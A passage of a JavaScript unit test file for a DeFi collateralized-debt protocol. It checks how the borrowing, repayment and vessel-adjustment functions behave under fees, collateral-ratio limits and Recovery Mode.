				from: D,
			})

			// Check GRVT staking VUSD balance has increased
			let GRVTStaking_VUSDBalance_After = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStaking_VUSDBalance_After.gt(GRVTStaking_VUSDBalance_Before))

			// Check D's VUSD balance now equals their initial balance plus request VUSD
			let D_VUSDBalanceAfter = await debtToken.balanceOf(D)
			assert.isTrue(D_VUSDBalanceAfter.eq(D_VUSDBalanceBefore.add(D_VUSDRequest)))

			//Asset:
			D_VUSDBalanceBefore = await debtToken.balanceOf(D)
			await borrowerOperations.withdrawDebtTokens(erc20.address, D_VUSDRequest, D, D, {
				from: D,
			})

			GRVTStaking_VUSDBalance_After = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStaking_VUSDBalance_After.gt(GRVTStaking_VUSDBalance_Before))

			D_VUSDBalanceAfter = await debtToken.balanceOf(D)
			assert.isTrue(D_VUSDBalanceAfter.eq(D_VUSDBalanceBefore.add(D_VUSDRequest)))
		})

		it("withdrawDebtTokens(): borrowing at zero base rate changes VUSD fees-per-unit-staked", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			// A artificially receives GRVT, then stakes it
			await grvtToken.unprotectedMint(A, dec(100, 18))
			await grvtStaking.stake(dec(100, 18), { from: A })

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// Check GRVT VUSD balance before == 0
			const F_VUSD_Before = await grvtStaking.F_DEBT_TOKENS()
			assert.equal(F_VUSD_Before, "0")

			// D withdraws VUSD
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(37, 18), D, D, { from: D })

			// Check GRVT VUSD balance after > 0
			const F_VUSD_After = await grvtStaking.F_DEBT_TOKENS()
			assert.isTrue(F_VUSD_After.gt("0"))
		})

		it("withdrawDebtTokens(): borrowing at zero fee sends full amount back to user", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Set BorrowingFee to  zero
			await adminContract.setBorrowingFee(erc20.address, 0)
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_1_Asset, "0")

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			let D_VUSDBalanceBefore = await debtToken.balanceOf(D)

			// D withdraws VUSD
			const D_VUSDRequest = toBN(dec(37, 18))
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(37, 18), D, D, { from: D })

			let D_VUSDBalanceAfter = await debtToken.balanceOf(D)
			// Check D's vessel debt == D's VUSD balance + liquidation reserve
			assert.isTrue(D_VUSDBalanceAfter.eq(D_VUSDBalanceBefore.add(D_VUSDRequest)))
		})

		it("withdrawDebtTokens(): reverts when calling address does not have active vessel", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			// Bob successfully withdraws VUSD
			const txBob_Asset = await borrowerOperations.withdrawDebtTokens(erc20.address, dec(100, 18), bob, bob, {
				from: bob,
			})
			assert.isTrue(txBob_Asset.receipt.status)

			// Carol with no active vessel attempts to withdraw VUSD

			try {
				const txCarol_Asset = await borrowerOperations.withdrawDebtTokens(erc20.address, dec(100, 18), carol, carol, {
					from: carol,
				})
				assert.isFalse(txCarol_Asset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawDebtTokens(): reverts when requested withdrawal amount is zero VUSD", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			// Bob successfully withdraws 1e-18 VUSD
			const txBob_Asset = await borrowerOperations.withdrawDebtTokens(erc20.address, 1, bob, bob, {
				from: bob,
			})
			assert.isTrue(txBob_Asset.receipt.status)

			// Alice attempts to withdraw 0 VUSD

			try {
				const txAlice_Asset = await borrowerOperations.withdrawDebtTokens(erc20.address, 0, alice, alice, {
					from: alice,
				})
				assert.isFalse(txAlice_Asset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawDebtTokens(): reverts when system is in Recovery Mode", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			// Withdrawal possible when recoveryMode == false
			const txAlice_Asset = await borrowerOperations.withdrawDebtTokens(erc20.address, dec(100, 18), alice, alice, {
				from: alice,
			})
			assert.isTrue(txAlice_Asset.receipt.status)

			await priceFeed.setPrice(erc20.address, "50000000000000000000")

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			//Check VUSD withdrawal impossible when recoveryMode == true

			try {
				const txBob_Asset = await borrowerOperations.withdrawDebtTokens(erc20.address, 1, bob, bob, {
					from: bob,
				})
				assert.isFalse(txBob_Asset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawDebtTokens(): reverts when withdrawal would bring the vessel's ICR < MCR", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(11, 17)),
				extraParams: { from: bob },
			})

			// Bob tries to withdraw VUSD that would bring his ICR < MCR

			try {
				const txBob_Asset = await borrowerOperations.withdrawDebtTokens(erc20.address, 1, bob, bob, {
					from: bob,
				})
				assert.isFalse(txBob_Asset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawDebtTokens(): reverts when a withdrawal would cause the TCR of the system to fall below the CCR", async () => {
			await priceFeed.setPrice(erc20.address, dec(100, 18))
			const price = await priceFeed.getPrice(erc20.address)

			// Alice and Bob creates vessels with 150% ICR.  System TCR = 150%.

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(15, 17)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(15, 17)),
				extraParams: { from: bob },
			})

			var TCR_Asset = (await th.getTCR(contracts, erc20.address)).toString()
			assert.equal(TCR_Asset, "1500000000000000000")

			// Bob attempts to withdraw 1 VUSD.
			// System TCR would be: ((3+3) * 100 ) / (200+201) = 600/401 = 149.62%, i.e. below CCR of 150%.

			try {
				const txBob_Asset = await borrowerOperations.withdrawDebtTokens(erc20.address, dec(1, 18), bob, bob, {
					from: bob,
				})
				assert.isFalse(txBob_Asset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawDebtTokens(): reverts if system is in Recovery Mode", async () => {
			// --- SETUP ---

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(15, 17)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(15, 17)),
				extraParams: { from: bob },
			})

			// --- TEST ---

			// price drops to 1ETH:150VUSD, reducing TCR below 150%
			await priceFeed.setPrice(erc20.address, "150000000000000000000")
			assert.isTrue((await th.getTCR(contracts, erc20.address)).lt(toBN(dec(15, 17))))

			try {
				const txData = await borrowerOperations.withdrawDebtTokens(erc20.address, "200", alice, alice, { from: alice })
				assert.isFalse(txData.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("withdrawDebtTokens(): increases the Vessel's VUSD debt by the correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			// check before

			const aliceDebtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)

			assert.isTrue(aliceDebtBefore_Asset.gt(toBN(0)))

			// check after

			const aliceDebtAfter_Asset = await getVesselEntireDebt(alice, erc20.address)

			th.assertIsApproximatelyEqual(aliceDebtAfter_Asset, aliceDebtBefore_Asset.add(toBN(100)))
		})

		it("withdrawDebtTokens(): increases VUSD debt in ActivePool by correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				assetSent: toBN(dec(100, "ether")),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const aliceDebtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)

			assert.isTrue(aliceDebtBefore_Asset.gt(toBN(0)))

			// check before
			const activePool_VUSD_Before_Asset = await activePool.getDebtTokenBalance(erc20.address)

			assert.isTrue(activePool_VUSD_Before_Asset.eq(aliceDebtBefore_Asset))

			await borrowerOperations.withdrawDebtTokens(
				erc20.address,
				await getNetBorrowingAmount(dec(10000, 18), erc20.address),
				alice,
				alice,
				{ from: alice }
			)

			// check after
			const activePool_VUSD_After_Asset = await activePool.getDebtTokenBalance(erc20.address)

			th.assertIsApproximatelyEqual(activePool_VUSD_After_Asset, activePool_VUSD_Before_Asset.add(toBN(dec(10000, 18))))
		})

		it("withdrawDebtTokens(): increases user debtToken balance by correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				assetSent: toBN(dec(100, "ether")),
				extraParams: { from: alice },
			})

			// check before
			let alice_debtTokenBalance_Before = await debtToken.balanceOf(alice)
			assert.isTrue(alice_debtTokenBalance_Before.gt(toBN("0")))

			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(10000, 18), alice, alice, {
				from: alice,
			})

			alice_debtTokenBalance_After = await debtToken.balanceOf(alice)
			assert.isTrue(alice_debtTokenBalance_After.eq(alice_debtTokenBalance_Before.add(toBN(dec(10000, 18)))))
		})

		// --- repayDebtTokens() ---
		it("repayDebtTokens(): reverts when repayment would leave vessel with ICR < MCR", async () => {
			// alice creates a Vessel and adds first collateral

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: bob },
			})

			// Price drops
			await priceFeed.setPrice(erc20.address, dec(100, 18))
			const price = await priceFeed.getPrice(erc20.address)

			assert.isFalse(await vesselManager.checkRecoveryMode(erc20.address, price))
			assert.isTrue((await vesselManager.getCurrentICR(erc20.address, alice, price)).lt(toBN(dec(110, 16))))

			const VUSDRepayment = 1 // 1 wei repayment

			await assertRevert(
				borrowerOperations.repayDebtTokens(erc20.address, VUSDRepayment, alice, alice, {
					from: alice,
				}),
				"BorrowerOps: An operation that would result in ICR < MCR is not permitted"
			)
		})

		it("repayDebtTokens(): Succeeds when it would leave vessel with net debt >= minimum net debt", async () => {
			// Make the VUSD request 2 wei above min net debt to correct for floor division, and make net debt = min net debt + 1 wei
			await borrowerOperations.openVessel(
				erc20.address,
				dec(100, 30),
				await getNetBorrowingAmount(MIN_NET_DEBT_ERC20.add(toBN("2")), erc20.address),
				A,
				A,
				{ from: A }
			)

			const repayTxA_Asset = await borrowerOperations.repayDebtTokens(erc20.address, 1, A, A, {
				from: A,
			})
			assert.isTrue(repayTxA_Asset.receipt.status)

			await borrowerOperations.openVessel(erc20.address, dec(100, 30), dec(20, 25), B, B, {
				from: B,
			})

			const repayTxB_Asset = await borrowerOperations.repayDebtTokens(erc20.address, dec(19, 25), B, B, { from: B })
			assert.isTrue(repayTxB_Asset.receipt.status)
		})

		it("repayDebtTokens(): reverts when it would leave vessel with net debt < minimum net debt", async () => {
			// Make the VUSD request 2 wei above min net debt to correct for floor division, and make net debt = min net debt + 1 wei
			await borrowerOperations
			await borrowerOperations.openVessel(
				erc20.address,
				dec(100, 30),
				await getNetBorrowingAmount(MIN_NET_DEBT_ERC20.add(toBN("2")), erc20.address),
				A,
				A,
				{ from: A }
			)

			const repayTxAPromise_Asset = borrowerOperations.repayDebtTokens(erc20.address, 2, A, A, {
				from: A,
			})

			await assertRevert(repayTxAPromise_Asset, "BorrowerOps: Vessel's net debt must be greater than minimum")
		})

		it("repayDebtTokens(): reverts when calling address does not have active vessel", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			// Bob successfully repays some VUSD
			const txBob_Asset = await borrowerOperations.repayDebtTokens(erc20.address, dec(10, 18), bob, bob, { from: bob })
			assert.isTrue(txBob_Asset.receipt.status)

			// Carol with no active vessel attempts to withdrawVUSD

			try {
				const txCarol_Asset = await borrowerOperations.repayDebtTokens(erc20.address, dec(10, 18), carol, carol, {
					from: carol,
				})
				assert.isFalse(txCarol_Asset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("repayDebtTokens(): reverts when attempted repayment is > the debt of the vessel", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			const aliceDebt_Asset = await getVesselEntireDebt(alice, erc20.address)

			// Bob successfully repays some debt tokens
			const txBob_Asset = await borrowerOperations.repayDebtTokens(erc20.address, dec(10, 18), bob, bob, { from: bob })
			assert.isTrue(txBob_Asset.receipt.status)

			// Alice attempts to repay more than her debt
			try {
				const txAlice_Asset = await borrowerOperations.repayDebtTokens(
					erc20.address,
					aliceDebt_Asset.add(toBN(dec(1, 18))),
					alice,
					alice,
					{ from: alice }
				)
				assert.isFalse(txAlice_Asset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		//withdrawVUSD: reduces VUSD debt in Vessel
		it("repayDebtTokens(): reduces the Vessel's VUSD debt by the correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			const aliceDebtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)

			assert.isTrue(aliceDebtBefore_Asset.gt(toBN("0")))

			await borrowerOperations.repayDebtTokens(erc20.address, aliceDebtBefore_Asset.div(toBN(10)), alice, alice, {
				from: alice,
			}) // Repays 1/10 her debt

			const aliceDebtAfter_Asset = await getVesselEntireDebt(alice, erc20.address)

			assert.isTrue(aliceDebtAfter_Asset.gt(toBN("0")))

			th.assertIsApproximatelyEqual(aliceDebtAfter_Asset, aliceDebtBefore_Asset.mul(toBN(9)).div(toBN(10))) // check 9/10 debt remaining
		})

		it("repayDebtTokens(): decreases VUSD debt in ActivePool by correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			const aliceDebtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)

			assert.isTrue(aliceDebtBefore_Asset.gt(toBN("0")))

			// Check beforea
			const activePool_VUSD_Before_Asset = await activePool.getDebtTokenBalance(erc20.address)

			assert.isTrue(activePool_VUSD_Before_Asset.gt(toBN("0")))

			await borrowerOperations.repayDebtTokens(erc20.address, aliceDebtBefore_Asset.div(toBN(10)), alice, alice, {
				from: alice,
			}) // Repays 1/10 her debt

			// check after
			const activePool_VUSD_After_Asset = await activePool.getDebtTokenBalance(erc20.address)

			th.assertIsApproximatelyEqual(
				activePool_VUSD_After_Asset,
				activePool_VUSD_Before_Asset.sub(aliceDebtBefore_Asset.div(toBN(10)))
			)
		})

		it("repayDebtTokens(): decreases user debtToken balance by correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			const aliceDebtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)

			assert.isTrue(aliceDebtBefore_Asset.gt(toBN("0")))

			let alice_debtTokenBalance_Before = await debtToken.balanceOf(alice)
			assert.isTrue(alice_debtTokenBalance_Before.gt(toBN("0")))

			// Repays 1/10 her debt
			const repayAmount = aliceDebtBefore_Asset.div(toBN(10))
			await borrowerOperations.repayDebtTokens(erc20.address, repayAmount, alice, alice, { from: alice })
			const alice_debtTokenBalance_After = await debtToken.balanceOf(alice)
			// accept 0,5% error margin, as part of the fee will be refunded
			const error = Number(aliceDebtBefore_Asset.mul(toBN(5)).div(toBN(1_000)))
			th.assertIsApproximatelyEqual(alice_debtTokenBalance_After, alice_debtTokenBalance_Before.sub(repayAmount), error)
		})

		it("repayDebtTokens(): can repay debt in Recovery Mode", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			const aliceDebtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)

			assert.isTrue(aliceDebtBefore_Asset.gt(toBN("0")))

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			await priceFeed.setPrice(erc20.address, "105000000000000000000")

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			const tx_Asset = await borrowerOperations.repayDebtTokens(
				erc20.address,
				aliceDebtBefore_Asset.div(toBN(10)),
				alice,
				alice,
				{ from: alice }
			)
			assert.isTrue(tx_Asset.receipt.status)

			// Check Alice's debt: 110 (initial) - 50 (repaid)

			const aliceDebtAfter_Asset = await getVesselEntireDebt(alice, erc20.address)

			th.assertIsApproximatelyEqual(aliceDebtAfter_Asset, aliceDebtBefore_Asset.mul(toBN(9)).div(toBN(10)))
		})

		it("repayDebtTokens(): Reverts if borrower has insufficient VUSD balance to cover his debt repayment", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})

			const bobBalBefore = await debtToken.balanceOf(B)
			assert.isTrue(bobBalBefore.gt(toBN("0")))

			// Bob transfers all but 5 of his VUSD to Carol
			await debtToken.transfer(C, bobBalBefore.sub(toBN(dec(5, 18))), { from: B })

			//Confirm B's VUSD balance has decreased to 5 VUSD
			const bobBalAfter = await debtToken.balanceOf(B)

			assert.isTrue(bobBalAfter.eq(toBN(dec(5, 18))))

			// Bob tries to repay 6 VUSD
			const repayVUSDPromise_B_Asset = borrowerOperations.repayDebtTokens(erc20.address, toBN(dec(6, 18)), B, B, {
				from: B,
			})

			await assertRevert(repayVUSDPromise_B_Asset, "Caller doesnt have enough VUSD to make repayment")
		})

		// --- adjustVessel() ---

		it("adjustVessel(): reverts when adjustment would leave vessel with ICR < MCR", async () => {
			// alice creates a Vessel and adds first collateral

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: bob },
			})

			// Price drops
			await priceFeed.setPrice(erc20.address, dec(100, 18))
			const price = await priceFeed.getPrice(erc20.address)

			assert.isFalse(await vesselManager.checkRecoveryMode(erc20.address, price))
			assert.isTrue((await vesselManager.getCurrentICR(erc20.address, alice, price)).lt(toBN(dec(110, 16))))

			const VUSDRepayment = 1 // 1 wei repayment
			const collTopUp = 1

			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, 0, 0, VUSDRepayment, false, alice, alice, {
					from: alice,
					value: collTopUp,
				}),
				"BorrowerOps: An operation that would result in ICR < MCR is not permitted"
			)
		})

		// Commented out as we have now a fixed borrowingfee
		/* it("adjustVessel(): reverts if max fee < 0.5% in Normal mode", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await assertRevert(
				borrowerOperations.adjustVessel(
					erc20.address,
					dec(2, 16),
					0,
					0,
					dec(1, 18),
					true,
					A,
					A,
					{ from: A }
				),
				"Max fee percentage must be between 0.5% and 100%"
			)
			await assertRevert(
				borrowerOperations.adjustVessel(
					erc20.address,
					dec(2, 16),
					1,
					0,
					dec(1, 18),
					true,
					A,
					A,
					{ from: A }
				),
				"Max fee percentage must be between 0.5% and 100%"
			)
			await assertRevert(
				borrowerOperations.adjustVessel(
					erc20.address,
					dec(2, 16),
					"4999999999999999",
					0,
					dec(1, 18),
					true,
					A,
					A,
					{ from: A }
				),
				"Max fee percentage must be between 0.5% and 100%"
			)
		})
		it("adjustVessel(): allows max fee < 0.5% in Recovery mode", async () => {
			await openVessel({
				asset: erc20.address,
				assetSent: toBN(dec(100, "ether")),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await priceFeed.setPrice(erc20.address, dec(120, 18))
			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))
			await borrowerOperations.adjustVessel(
				erc20.address,
				dec(300, 18),
				0,
				0,
				dec(1, 9),
				true,
				A,
				A,
				{ from: A }
			)
			await priceFeed.setPrice(erc20.address, dec(1, 18))
			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))
			await borrowerOperations.adjustVessel(
				erc20.address,
				dec(30000, 18),
				1,
				0,
				dec(1, 9),
				true,
				A,
				A,
				{ from: A }
			)
			await priceFeed.setPrice(erc20.address, dec(1, 16))
			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))
			await borrowerOperations.adjustVessel(
				erc20.address,
				dec(3000000, 18),
				"4999999999999999",
				0,
				dec(1, 9),
				true,
				A,
				A,
				{ from: A }
			)
		})
		it("adjustVessel(): decays a non-zero base rate", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			// Check baseRate is now non-zero
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))
			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)
			// D adjusts vessel
			await borrowerOperations.adjustVessel(
				erc20.address,
				0,
				0,
				dec(37, 18),
				true,
				D,
				D,
				{ from: D }
			)
			// Check baseRate has decreased
			assert.isTrue(baseRate_2.lt(baseRate_1))
			const baseRate_2_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_2_Asset.lt(baseRate_1_Asset))
			// 1 hour passes
			th.fastForwardTime(3600, web3.currentProvider)
			// E adjusts vessel
			await borrowerOperations.adjustVessel(
				erc20.address,
				0,
				0,
				dec(37, 15),
				true,
				E,
				E,
				{ from: D }
			)
			const baseRate_3_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_3.lt(baseRate_2))
			assert.isTrue(baseRate_3_Asset.lt(baseRate_2_Asset))
		})
		it("adjustVessel(): doesn't decay a non-zero base rate when user issues 0 debt", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			// D opens vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			// Check baseRate is now non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))
			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)
			// D adjusts vessel with 0 debt
			await borrowerOperations.adjustVessel(
				erc20.address,
				dec(1, "ether"),
				0,
				0,
				false,
				D,
				D,
				{ from: D }
			)
			// Check baseRate has not decreased
			const baseRate_2_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_2.eq(baseRate_1))
			assert.isTrue(baseRate_2_Asset.eq(baseRate_1_Asset))
		})
		it("adjustVessel(): doesn't change base rate if it is already zero", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			// Check baseRate is zero
			// assert.equal(baseRate_1, "0")
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_1_Asset, "0")
			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)
			// D adjusts vessel
			await borrowerOperations.adjustVessel(
				erc20.address,
				0,
				0,
				dec(37, 18),
				true,
				D,
				D,
				{ from: D }
			)
			// Check baseRate is still 0
			assert.equal(baseRate_2, "0")
			const baseRate_2_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_2_Asset, "0")
			// 1 hour passes
			th.fastForwardTime(3600, web3.currentProvider)
			// E adjusts vessel
			await borrowerOperations.adjustVessel(
				erc20.address,
				0,
				0,
				dec(37, 15),
				true,
				E,
				E,
				{ from: D }
			)
			const baseRate_3_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_3_Asset, "0")
		})
		it("adjustVessel(): lastFeeOpTime doesn't update if less time than decay interval has passed since the last fee operation", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
